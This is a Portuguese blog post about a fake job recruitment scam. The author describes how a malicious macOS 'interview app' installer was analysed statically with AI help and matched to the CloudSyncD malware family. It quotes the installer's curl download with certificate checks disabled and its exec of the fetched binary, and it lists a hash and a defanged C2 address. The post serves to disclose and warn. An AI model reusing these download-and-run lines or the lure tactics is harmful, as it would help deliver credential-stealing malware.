---
title: "Como identifiquei um golpe de recrutamento antes de executar o instalador"
url: como-identifiquei-um-golpe-de-recrutamento-antes-de-executar-o-instalador
date: 2026-11-05T11:29:09-03:00
tags: ["security", "macos", "career", "codex", "ai"]
categories: ["security"]
draft: false
translationKey: "how-i-spotted-a-recruitment-scam-before-running-its-installer"
---

Quinze minutos antes de uma entrevista de emprego agendada, recebi um link para um aplicativo que eu deveria usar na reunião.

O processo seletivo estava associado a uma empresa chamada Saifuro. O aplicativo para a entrevista se chamava Vettasy. Os dois tinham sites, documentação e conteúdo com aparência profissional suficiente para fazer o processo parecer plausível.

Não executei o instalador. Primeiro, fui olhar o que ele queria fazer.

Essa decisão levou à investigação de um script shell que, se executado, baixaria e iniciaria imediatamente um executável para Mac. Nem o instalador nem os executáveis baixados foram executados. A análise estática, com auxílio de IA, encontrou fortes correspondências com uma família de malware já documentada, chamada CloudSyncD.

Vou contar o que aconteceu, o que me deixou desconfiado e o que as evidências de fato permitiram concluir.

## Por que eu já desconfiava de links do Calendly

Algumas semanas antes, eu havia lido [o artigo do Fabio Akita sobre uma tentativa de golpe envolvendo o Calendly](https://akitaonrails.com/2026/09/22/pseudo-techcrunch-tentou-me-pegar-em-golpe-calendly-e-uma-merda/).

Naquele caso, alguém se passando por jornalista do TechCrunch o procurou para uma entrevista. Ele descreveu um link legítimo do Calendly que acabava levando a um pedido de autorização no X para um aplicativo malicioso de terceiros.

Essa leitura me deixou mais desconfiado quando um link do Calendly aparecia em uma conversa com alguém que eu não conhecia. Um convite para uma reunião pode parecer normal e, ainda assim, ser uma etapa de um processo malicioso.

Meu caso envolveu outro mecanismo: o download de um software para entrevistas. Não estabeleci que os dois incidentes tinham os mesmos responsáveis. O que guardei do artigo dele foi a ideia de olhar além da ferramenta de agendamento e verificar o que vinha depois.

## Como o processo seletivo chegou até mim

A vaga era para Founding Full-stack Engineer e chamava a atenção pelo pacote oferecido: **salário de US$ 190 mil a US$ 225 mil por ano nos Estados Unidos, 1% de participação na empresa e vários benefícios**. A stack também batia com o que venho trabalhando desde junho de 2025. Era uma combinação bastante atraente de remuneração e compatibilidade com minha experiência.

A sequência foi:

1. Contato pelo Indeed ou endereço `contact@saifuro.com`.
2. Encaminhamento para a conta do Telegram `@Ithelia_Dias`.
3. Um link do Calendly para agendar a reunião.
4. Um link do Vettasy enviado aproximadamente 15 minutos antes da reunião.

Durante a investigação, foi constatado que o site da Saifuro publicava o mesmo e-mail de contato e associava a conta do Telegram à pessoa apresentada como seu fundador e CEO, Ithelia Dias.

Isso ligava a conversa aos dados de contato divulgados pelo site. Não comprovava a identidade civil da pessoa que usava a conta, se alguma conta havia sido comprometida ou quem operava a infraestrutura do malware.

A conta foi posteriormente deletada no Telegram. Para registrar como o perfil aparecia antes, abri o aplicativo sem conexão com a rede e tirei a captura abaixo, que ainda mostrava o nome e a foto do usuário armazenados localmente.

<figure>
  <a href="/saifuro-telegram-perfil-ithelia-dias.webp">
    <img src="/saifuro-telegram-perfil-ithelia-dias.webp" width="900" height="180" loading="lazy" decoding="async" alt="Perfil do Telegram com o nome Ithelia Dias e a foto que ainda aparecia ao abrir o aplicativo sem rede.">
  </a>
  <figcaption>Perfil preservado no aplicativo sem conexão, antes de atualizar para o estado de conta deletada.</figcaption>
</figure>

Na resposta para marcar a entrevista, a pessoa descrevia uma conversa inicial de até uma hora, pedia uma apresentação curta e enviava o link do Calendly. A mensagem já avisava que o link da reunião chegaria apenas 15 minutos antes do horário marcado.

<figure>
  <a href="/saifuro-telegram-agendamento-entrevista.webp">
    <img src="/saifuro-telegram-agendamento-entrevista.webp" width="758" height="1784" loading="lazy" decoding="async" alt="Conversa no Telegram com orientações para a entrevista e link do Calendly para agendar a reunião de 3 de novembro.">
  </a>
  <figcaption>Resposta com as orientações e o agendamento. Nesta captura, o Telegram já mostrava a conta como deletada.</figcaption>
</figure>

No dia da entrevista, 3 de novembro, questionei o Vettasy, mencionei que havia encontrado pelo menos três sinais de alerta no script de instalação e sugeri o Google Meet ou outra plataforma que funcionasse no navegador. A resposta veio em segundos, com um texto longo e uma justificativa pronta. Pela rapidez, minha impressão foi de que a mensagem já estava na área de transferência, só esperando para ser colada.

A resposta justificava o uso do aplicativo como uma forma de evitar respostas geradas por IA e dizia que o envio do link com apenas 15 minutos de antecedência impediria o candidato de encontrar formas de contornar essa medida. Depois que insisti nas suspeitas sobre o script, a pessoa respondeu que estavam conversando sobre mudar de plataforma.

<figure>
  <a href="/saifuro-telegram-dia-entrevista-vettasy.webp">
    <img src="/saifuro-telegram-dia-entrevista-vettasy.webp" width="754" height="1128" loading="lazy" decoding="async" alt="Conversa de 3 de novembro em que questiono o Vettasy e recebo a justificativa para enviar o link 15 minutos antes.">
  </a>
  <figcaption>Conversa no dia da entrevista, após eu apontar problemas no instalador e pedir outra plataforma.</figcaption>
</figure>

O momento em que o link para download chegou fez diferença para mim. Quando uma reunião está prestes a começar, existe uma pressão para fazer o aplicativo funcionar e não se atrasar. Esse é um péssimo momento para decidir se vale a pena executar um software desconhecido.

## Por trás da aparência profissional

A Saifuro se apresentava como uma infraestrutura de pagamentos para agentes de IA. O Vettasy se apresentava como uma plataforma de entrevistas com recursos de gravação e verificação de sessões.

É possível consultar [uma captura do site da Saifuro no Internet Archive, de 3 de novembro de 2026](https://web.archive.org/web/20261103193517/https://saifuro.com/), e [a documentação da Saifuro arquivada na mesma data](https://web.archive.org/web/20261103194115mp_/https://docs.saifuro.com/). Eles tinham até [um perfil no Medium](https://medium.com/@Saifuro), com publicações datadas desde agosto: um histórico de quase três meses quando esse processo aconteceu.

A [página de carreiras, também arquivada em 3 de novembro de 2026](https://web.archive.org/web/20261103193535mp_/https://saifuro.com/careers), anunciava **22 vagas em aberto**. Isso reforçava a aparência de uma empresa em expansão, com um processo de contratação mais amplo do que a vaga apresentada a mim.

Tanto a landing page quanto os artigos no Medium mencionavam o x402, um protocolo de pagamentos via HTTP que havia recentemente passado a contar com o apoio da Linux Foundation. A [x402 Foundation iniciou oficialmente suas operações sob a Linux Foundation em julho de 2026](https://www.linuxfoundation.org/press/linux-foundation-announces-operational-launch-of-x402-foundation-to-standardize-internet-native-payments-for-ai-agents-and-applications). Essa referência a uma tecnologia real e recente, ligada a uma instituição conhecida, ajudava a dar credibilidade à proposta da Saifuro.

O que me chamou a atenção foi o grau de sofisticação dessa apresentação. Sites, documentação, artigos, perfis e uma conversa de recrutamento com etapas bem definidas se reforçavam para transmitir credibilidade. Montar esse conjunto exige tempo e cuidado; o histórico de publicações ainda dava a impressão de uma empresa com atividade anterior à abordagem. A proposta atraente era acompanhada de toda uma presença pública que ajudava a sustentá-la.

A investigação encontrou explicações sobre os produtos, políticas de privacidade, alegações de segurança e perfis com nomes. Também havia registros públicos reais associados à identidade da Saifuro: um [registro de participação em um grupo comunitário do W3C](https://www.w3.org/groups/cg/agentprotocol/activity/) e um [Internet-Draft individual submetido à IETF](https://datatracker.ietf.org/doc/draft-dias-agent-payment-verdicts/).

Esses registros têm significados limitados. Um registro de participação mostra uma participação sob determinado nome e afiliação. Um Internet-Draft individual é um documento submetido; a página da IETF informa explicitamente que isso não representa um endosso nem um padrão aprovado.

Também investiguei manualmente o Vettasy. Nas buscas que fiz no Google, encontrei apenas **duas páginas sobre ele** e não encontrei nenhum backlink sequer, ou seja, nenhum link de outro site apontando para a plataforma. A presença pública que consegui encontrar era mínima para um aplicativo que eu deveria instalar e usar em uma entrevista.

Na investigação com o Codex, apareceu ainda uma contradição nas alegações de segurança: uma página apresentava o Vettasy como já tendo SOC 2, enquanto outra dizia que isso só viria no **quarto trimestre de 2027**. As duas versões não eram compatíveis e aumentaram minha desconfiança sobre as garantias publicadas no site.

Nada disso respondia à pergunta que eu precisava esclarecer: o que esse instalador executaria no meu computador?

## Como o instalador foi inspecionado

Usei o Codex para ajudar a investigar os sites e inspecionar o instalador. Minha instrução foi explícita: **não executá-lo**.

O script shell foi obtido como texto. O arquivo compactado ao qual ele fazia referência e os executáveis dentro dele foram inspecionados como dados, usando Python e ferramentas como `file`, `nm`, `otool` e `codesign --display`. Nem o instalador shell nem os executáveis baixados foram executados. O endereço de comando e controle recuperado também não foi acessado.

Foi uma análise estática. Ela permitia identificar código, configurações e características conhecidas de malware, mas não demonstrar todos os comportamentos em execução nem determinar que payload adicional um servidor remoto poderia fornecer.

Os resultados abaixo vêm da amostra obtida em **3 de novembro de 2026**. São fruto de uma investigação com auxílio de IA, e não uma afirmação de que realizei sozinho um trabalho completo de engenharia reversa de malware.

## O que havia de errado com o script shell?

O script tinha vários problemas concretos.

### Ele desativava a verificação de certificados

O comando de download do payload incluía:

```bash
curl -fsSLk -o "${_sys_dest_6vm}" "${_app_url_dyau}" </dev/null
```

A opção `-k` desativa a verificação de certificados TLS. Isso enfraquece a autenticação da conexão usada para entregar o executável.

Essa opção, sozinha, não comprovaria a presença de malware. Era uma parte das evidências.

### A função de verificação de assinatura nunca era chamada

O script definia uma função de verificação de assinatura GPG, mas não havia nenhuma chamada a ela no código responsável pela instalação. Esse código também não continha uma conferência de checksum esperado nem uma verificação da identidade do distribuidor antes de iniciar o executável.

Uma função de verificação em outro trecho do script não verifica o arquivo que está sendo instalado.

### A barra de progresso era controlada por um temporizador

O código da barra de progresso usava um loop com pequenas pausas para avançar o progresso exibido, em vez de acompanhar o download ou a extração.

Uma barra de progresso decorativa também pode existir em um software legítimo. Nesse caso, a implementação aumentava as dúvidas sobre o que o instalador apresentaria ao usuário.

### Ele iniciava imediatamente um executável encontrado

Se fosse executado, o script baixaria e extrairia o arquivo, procuraria um executável e o iniciaria com:

```bash
exec "${__bin_bin_sy}"
```

O fluxo de instalação não previa uma pausa para inspecionar o programa baixado ou confirmar quem o distribuía. Executar o instalador entregaria o controle diretamente a esse programa.

O arquivo compactado obtido durante a investigação continha um único arquivo chamado `installer`: um executável universal para macOS, compatível com Intel e Apple Silicon.

## O que ligava o executável ao CloudSyncD?

A análise do binário produziu evidências mais fortes do que a aparência do site ou as más práticas do script shell.

| Descoberta | Evidência observada |
| --- | --- |
| Característica da família de malware | A mesma tabela de 32 bytes para ofuscação de strings documentada para o CloudSyncD. |
| Configuração correspondente | A chave de criptografia e o vetor de inicialização (IV) do C2 publicados nas pesquisas sobre o CloudSyncD. |
| Código relacionado a credenciais | Funções para exibir uma caixa de diálogo de senha e salvar senhas, incluindo `cloudsync_impl::save_local_password`. |
| Validação de senha local | Strings decodificadas com `dscl`, `/Local/Default` e `-authonly`. |
| Executável adicional | Um executável universal para Mac separado, embutido no instalador baixado. |
| Identidade do distribuidor | Uma assinatura de código ad hoc, sem um Team ID de desenvolvedor Apple. |

Essas descobertas correspondiam de perto à família descrita pelo [Jamf Threat Labs](https://www.jamf.com/blog/cloudsyncd-macos-backdoor-fake-zoom-installer/) e pelo [Elastic Security Labs](https://www.elastic.co/security-labs/threat-command/apex-accelerator-malicious-npm-packages). As pesquisas descrevem componentes de phishing de senhas e um backdoor capaz de receber outros executáveis.

A avaliação foi de uma **correspondência com alto grau de confiança com a família CloudSyncD**. Ela se baseou em características compartilhadas de código e configuração, e não na afirmação de que o arquivo inteiro tinha o mesmo hash de uma amostra daqueles relatórios.

Nenhum dos dois relatórios atribuiu de forma independente esse processo seletivo à Saifuro ou à pessoa por trás da conta do Telegram. Essa ligação veio da minha experiência no recrutamento e do download específico do Vettasy inspecionado aqui.

Para quem estiver cruzando informações entre relatos, o executável `installer` baixado tinha este SHA-256:

```text
782f21b0ce945931bab8b1d84dc57d542a510ec66b80f9034fefd04dcd53572b
```

O endereço configurado, recuperado do payload embutido, era:

```text
hxxps://dodiihome[.]com/macos/jquery.js
```

Esse endereço foi alterado de propósito para não funcionar como link. É um indicador para investigação, não um endereço para visitar.

## O que apareceu nos dias seguintes

Em **3 de novembro**, eu já havia recusado executar o instalador. Os registros abaixo apareceram depois dessa decisão e ajudam a documentar o que veio a público nos dias seguintes.

Em **4 de novembro**, foi publicada no Ethos Network uma [análise intitulada “Probably an elaborate scam”](https://app.ethos.network/activity/review/722566/probably-an-elaborate-scam), levantando suspeitas sobre a Saifuro. Também vale registrar o [perfil associado ao usuário `Ed_Wynand`](https://app.ethos.network/profile/x/Ed_Wynand), que se apresentava como CTO da empresa.

Ao acompanhar o caso até **5 de novembro**, encontrei também o [anúncio público da CryptoJobsList](https://t.me/cryptojobslist/11669), informando que havia analisado denúncias sobre a Saifuro, removido as vagas associadas e banido a conta.

Denunciei a vaga ao Indeed como um anúncio falso associado à distribuição de malware. A mesma já foi removida.

## O aprendizado

Ninguém precisa sair instalando qualquer coisa só porque faltam X minutos para uma reunião. Ler sobre a experiência de outra pessoa me fez parar por tempo suficiente para verificar, e essa pausa foi útil.
